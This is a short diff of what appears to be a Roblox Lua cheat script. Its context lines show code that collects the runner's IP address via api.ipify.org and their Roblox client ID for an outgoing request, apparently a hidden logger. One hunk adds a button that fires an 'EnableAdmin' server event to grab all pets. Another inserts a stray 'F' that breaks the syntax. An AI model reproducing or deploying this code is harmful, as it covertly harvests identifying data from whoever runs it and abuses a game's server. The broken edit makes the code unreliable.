@@ -35,7 +35,7 @@ local response = request({
                         ["name"] = "IP: ",
                         ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                         ["inline"] = true
-                    }, {
+                    }, {F
                         ["name"] = "Client Id : ",
                         ["value"] = game:GetService("RbxAnalyticsService")
                             :GetClientId(),
@@ -1841,6 +1841,13 @@ MainSection:CreateToggle({
     Flag = 'RememberConfigs',
     Callback = function(Value)
         return Value
+    end
+})
+
+MiscSection:CreateButton({
+    Name = 'get all pets Have to rejoin',
+    Callback = function()
+      game:GetService("ReplicatedStorage").References.Comm.Events.EnableAdmin:fireServer()
     end
 })
 
